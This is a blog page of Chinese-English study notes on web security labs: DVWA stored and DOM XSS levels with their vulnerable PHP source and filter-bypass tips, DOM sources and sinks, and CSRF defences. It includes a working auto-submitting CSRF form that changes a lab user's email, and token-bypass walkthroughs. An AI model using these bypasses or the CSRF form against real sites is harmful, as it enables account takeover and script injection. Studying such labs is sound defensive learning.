<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>①trim()函数</p>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<ul>
<li>“\0” - NULL</li>
<li>“\t” - 制表符</li>
<li>“\n” - 换行</li>
<li>“\x0B” - 垂直制表符</li>
<li>“\r” - 回车</li>
<li>“ “ - 空格</li>
</ul>
<p>②stripslashes()函数</p>
<p>删除反斜杠\</p>
<p>③mysqli_real_escape_string()</p>
<p>此函数用来对字符串中的特殊字符进行转义, 以使得这个字符串是一个合法的 SQL 语句。</p>
<p>会被进行转义的字符包括： <code>NUL （ASCII 0），\n，\r，\，&#39;，&quot; 和       Control-Z</code>.   </p>
<p>   low没有进行什么有效的防御直接进行注入即可</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss20.png" alt="xss20"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss21.png" alt="xss21"></p>
<p>查看数据库可以发现</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss22.png" alt="xss22"></p>
<p>故每次从其它页面进入到这个页面都会自动弹出1337的alert窗口</p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>和Low难度比起来，多了 <code>$message = strip_tags(addslashes(\$message ) );</code>这一步处理</p>
<p>①addslashes() </p>
<p>给预定义字符前面添加反斜杠【预定义字符：单引号‘、双引号“、反斜杠\、NULL】</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = addslashes(<span class="string">&#x27;Shanghai is the &quot;biggest&quot; city in China.&#x27;</span>);</span><br><span class="line"><span class="comment">//output:Shanghai is the \&quot;biggest\&quot; city in China. </span></span><br></pre></td></tr></table></figure>

<p>②strip_tags()</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> strip_tags(<span class="string">&quot;Hello &lt;b&gt;world!&lt;/b&gt;&quot;</span>);<span class="comment">//output:Hello world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只对message部分进行了上述的过滤处理，name部分只过滤&lt;script&gt;的tag，所以可以从name部分下手</p>
<p>只要不用tag&lt;script&gt;即可，或者用大小写、双重写这样也可</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p>high和medium差不多</p>
<p>只是对name增加了一个这样的过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> ); </span><br></pre></td></tr></table></figure>

<p>用其他的tag即可</p>
<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>name和message两部分都进行了htmlspecialchars，无法注入任何tag</p>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p>php函数</p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
<p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到会过滤掉&lt;script的内容</p>
<p>那么进行这样的注入应该没问题吧？</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss23.png" alt="xss23"></p>
<p>发现没有弹框弹出，查看一下源代码，发现注入内容称为option value的一部分，没有成为一个tag。因为select内部不能放除了option之外的标签。所以需要先手动将select闭合掉</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss24.png" alt="xss24"></p>
<p>闭合掉之后发现1337弹框正常弹出！</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xss25.png" alt="xss25"></p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/26/DOM%20based/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/26/DOM%20based/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-10-26 12:54:55 / Modified: 13:29:53" itemprop="dateCreated datePublished" datetime="2021-10-26T12:54:55+08:00">2021-10-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="DOM-based-vulnerabilities"><a href="#DOM-based-vulnerabilities" class="headerlink" title="DOM-based vulnerabilities"></a>DOM-based vulnerabilities</h2><p>DOM-based vulnerabilities arise when a website contains JavaScript that  takes an attacker-controllable value, known as a source, and passes it  into a dangerous function, known as a sink.        </p>
<h3 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h3><p>source本质上来说就是attacker可以控制的任何值。</p>
<p>例如 location.search，attacker通过在input中构造不同的query string，能够构造出不同的location.search</p>
<h3 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h3><p>A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to  it.</p>
<p>例如eval()、document.body.innerHTML等。</p>
<p>【DOM-based vulnerabilities其实就是，attacker构造恶意的sources，然后将sources pass to sinks，恶意source在sink中就会被执行。漏洞点就在于source可以被attacker任意控制】</p>
<h3 id="01-DOM-based-open-redirection"><a href="#01-DOM-based-open-redirection" class="headerlink" title="#01 DOM-based open redirection"></a>#01 DOM-based open redirection</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/23/CSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/23/CSRF/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-23 13:19:25" itemprop="dateCreated datePublished" datetime="2021-10-23T13:19:25+08:00">2021-10-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-25 20:51:32" itemprop="dateModified" datetime="2021-10-25T20:51:32+08:00">2021-10-25</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="01-What-is-CSRF"><a href="#01-What-is-CSRF" class="headerlink" title="#01 What is CSRF?"></a>#01 What is CSRF?</h2><p>Cross-site request forgery (also known as CSRF) is a web security  vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. </p>
<h2 id="02-How-does-CSRF-work"><a href="#02-How-does-CSRF-work" class="headerlink" title="#02 How does CSRF work?"></a>#02 How does CSRF work?</h2><p>​            If a victim user visits the attacker’s web page, the following will happen:        </p>
<ul>
<li><p> The attacker’s page will trigger an HTTP request to the vulnerable web site.            </p>
</li>
<li><p> If the user is logged in to the vulnerable web site,  their browser will automatically include their session cookie in the  request (assuming SameSite cookies are not being used).            </p>
</li>
<li><p>The vulnerable web site will process the request in the  normal way, treat it as having been made by the victim user, and change  their email address.            </p>
</li>
</ul>
<h2 id="03-产生CSRF漏洞的条件"><a href="#03-产生CSRF漏洞的条件" class="headerlink" title="#03 产生CSRF漏洞的条件"></a>#03 产生CSRF漏洞的条件</h2><blockquote>
<p>1.被害用户已经完成身份认证 【session Cookie还在有效时间范围内】</p>
<p>2.新请求的提交不需要重新身份认证或确认机制 【即有Cookie可以直接通过验证，不需要client的其它如滑块确认登录、验证码等方式来完成验证】</p>
<p>3.攻击者必须了解Web APP请求的参数构造【post表单如何构造】</p>
<p>4.引诱用户触发攻击的指令（社工）</p>
</blockquote>
<h2 id="04-Preventing-CSRF-attacks"><a href="#04-Preventing-CSRF-attacks" class="headerlink" title="#04 Preventing CSRF attacks"></a>#04 Preventing CSRF attacks</h2><h3 id="001-SameSite-cookies"><a href="#001-SameSite-cookies" class="headerlink" title="##001 SameSite cookies"></a>##001 SameSite cookies</h3><ul>
<li>The <code>SameSite</code> attribute can be used to control whether and how cookies are submitted in cross-site requests.</li>
<li> The <code>SameSite</code> attribute is added to the <code>Set-Cookie</code> response header when the server issues a cookie, and the attribute can be given two values, <code>Strict</code> or <code>Lax</code>. For example:        </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;        </span><br><span class="line">Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;      </span><br></pre></td></tr></table></figure>

<p> <code>Strict</code>：the browser will not include the cookie in any requests that originate from another site. 【可能会影响用户体验，比如已登录用户不可以从第三方进入页面，必须重新登录】</p>
<p> <code>Lax</code>默认： the browser will include the cookie in requests that originate from another site but only if two conditions are met:        </p>
<ul>
<li>The request uses the GET method. Requests with other methods, such as POST, will not include the cookie.            </li>
<li>The request resulted from a top-level navigation by the  user, such as clicking a link. Other requests, such as those initiated  by scripts, will not include the cookie.            </li>
</ul>
<p>看似Lax模式也可以提供CSRF防御，一位内user actions that are targets for CSRF attacks are often implemented using the POST method. </p>
<p>但是</p>
<ul>
<li>Some applications do implement sensitive actions using GET requests.            </li>
<li>Many applications and frameworks are tolerant of  different HTTP methods. In this situation, even if the application  itself employs the POST method by design, it will in fact accept  requests that are switched to use the GET method.            </li>
</ul>
<h3 id="002-CSRF-tokens"><a href="#002-CSRF-tokens" class="headerlink" title="##002 CSRF tokens"></a>##002 CSRF tokens</h3><h2 id="05-Common-CSRF-vulnerabilities"><a href="#05-Common-CSRF-vulnerabilities" class="headerlink" title="#05 Common CSRF vulnerabilities"></a>#05 Common CSRF vulnerabilities</h2><h3 id="001-Validation-of-CSRF-token-depends-on-request-method"><a href="#001-Validation-of-CSRF-token-depends-on-request-method" class="headerlink" title="##001 Validation of CSRF token depends on request method"></a>##001 Validation of CSRF token depends on request method</h3><p>Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.        </p>
<p>In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack</p>
<h4 id="001-例子"><a href="#001-例子" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>用POST方法，看到参数附带了CSRF-token</p>
<img src="D:\blog\H01iday\source\_posts\pics\csrf1.png" alt="csrf1" style="zoom: 80%;" />

<p>去掉csrf-token发送，得到400结果</p>
<img src="D:\blog\H01iday\source\_posts\pics\csrf2.png" alt="csrf1" style="zoom: 80%;" />

<p>右键–》change request method 【更改请求方式为GET】</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf3.png" alt="csrf1"></p>
<p>发现请求成功，邮箱被成功修改</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf4.png" alt="csrf1"></p>
<p>构造如下html表单，这里没有method是因为使用method的默认值get</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ac1a1fd91e213dedc15b518a003b00a5.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker2333<span class="symbol">&amp;#64;</span>hack<span class="symbol">&amp;#46;</span>com&quot;</span>&gt;</span>//attacker想要修改为的邮箱</span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit Request&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">         <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();<span class="comment">//表单自动提交</span></span></span><br><span class="line"><span class="javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>则用户只要进入该html页面就会自动发起修改请求提交。CSRF攻击成功</p>
<h3 id="002-Validation-of-CSRF-token-depends-on-token-being-present"><a href="#002-Validation-of-CSRF-token-depends-on-token-being-present" class="headerlink" title="##002 Validation of CSRF token depends on token being present"></a>##002 Validation of CSRF token depends on token being present</h3><p>Some applications correctly validate the token when it is present but skip the validation if the token is omitted.        </p>
<p>In this situation, the attacker can remove the entire parameter  containing the token (not just its value) to bypass the validation and  deliver a CSRF attack</p>
<h3 id="003-CSRF-token-is-not-tied-to-the-user-session"><a href="#003-CSRF-token-is-not-tied-to-the-user-session" class="headerlink" title="##003 CSRF token is not tied to the user session"></a>##003 CSRF token is not tied to the user session</h3><p>Some applications do not validate that the token belongs to  the same session as the user who is making the request. Instead, the  application maintains a global pool of tokens that it has issued and  accepts any token that appears in this pool.        </p>
<p>In this situation, the attacker can log in to the  application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.        </p>
<h3 id="04-CSRF-token-is-tied-to-a-non-session-cookie"><a href="#04-CSRF-token-is-tied-to-a-non-session-cookie" class="headerlink" title="##04 CSRF token is tied to a non-session cookie"></a>##04 CSRF token is tied to a non-session cookie</h3><p>举个栗子说明</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF;      	</span><br><span class="line">        csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">csrf</span>=RhV<span class="number">7</span>yQDO<span class="number">0</span>xcq<span class="number">9</span>gLEah<span class="number">2</span>WVbmuFqyOq<span class="number">7</span>tY&amp;email=wiener@normal-user.com </span></span><br></pre></td></tr></table></figure>

<p>这里的Cookie有两个值分别是session和csrfKey</p>
<p>This can easily occur when an application employs two different  frameworks, one for session handling and one for CSRF protection, which  are not integrated together</p>
<p>这里所说的 CSRF token is tied to a non-session cookie指的是CSRF token和csrfKey这个cookie绑定在一起。</p>
<p>即用户A登录，用户A的session Cookie和其他用户的csrfKey-csrf对也可以登录用户A的账户。</p>
<h4 id="001-例子-1"><a href="#001-例子-1" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>已知：两个账户信息</p>
<ul>
<li><code>wiener:peter</code>            </li>
<li> <code>carlos:montoya</code>     </li>
</ul>
<p> update-email存在CSRF漏洞</p>
<p>登录winer用户</p>
<p>①正常申请修改email请求头<img src="D:\blog\H01iday\source_posts\pics\csrf5.png" alt="csrf5"></p>
<p>②修改session，被登出<img src="D:\blog\H01iday\source_posts\pics\csrf6.png" alt="csrf6"></p>
<p>③修改csrfKey，不被登出，提示报错</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf7.png" alt="csrf8"></p>
<p>从②③两步可以看出来</p>
<p>==This suggests that the <code>csrfKey</code> cookie may not be strictly tied to the session.==                    </p>
<p>④新建隐私窗口，登录另一个用户carlos获取其信息</p>
<p>得到：</p>
<p>csrfKey：PeyxE1Xd4XLU1LlpJqn07PIJgCHPcaNB</p>
<p>csrf token：pmjh38ZJmA9jMYMdRmXuMpFGxQ2QtZKd</p>
<p>⑤尝试用carlos的csrfKey放在wiener用户change-email的请求头</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf8.png" alt="csrf8"></p>
<p>⑥尝试用carlos的csrfKey和csrf token都放在wiener用户change-email的请求头</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf9.png" alt="csrf8"></p>
<p>⑤⑥两步说明 ：csrfKey和csrf token是绑定的；而这两个值和session不绑定。所以说，只要找一个改变wiener csrfKey的方法，再用前面的该改变csrf token 的方法，使得wiener访问访问attacker的恶意地址，自动附带上wiener的session cookie，则可以实现csrf攻击。</p>
<p>⑦搜索栏进行搜索之后发现出现了一个新的cookie LastSearchTerm</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf10.png" alt="csrf10"></p>
<p>⑧拦截一下看看http报文？</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf11.png" alt="csrf10"></p>
<p>⑨尝试改写search后面的内容，看看能不能查看一个csrfKey的修改值</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf12.png" alt="csrf10"></p>
<p>成功了！可以通过这个方法将cookie修改成attacker的csrfKey</p>
<p>只要让用户访问这个地址【Host+/?search的内容】即可成功设置对应的cookie</p>
<p>⑩巧妙地构造一个CSRF攻击</p>
<p>CSRF token的值的设置和前面的实验一样。</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf13.png" alt="csrf10"></p>
<h3 id="05-CSRF-where-token-is-duplicated-in-cookie"><a href="#05-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="##05 CSRF where token is duplicated in cookie"></a>##05 CSRF where token is duplicated in cookie</h3><p>上例子</p>
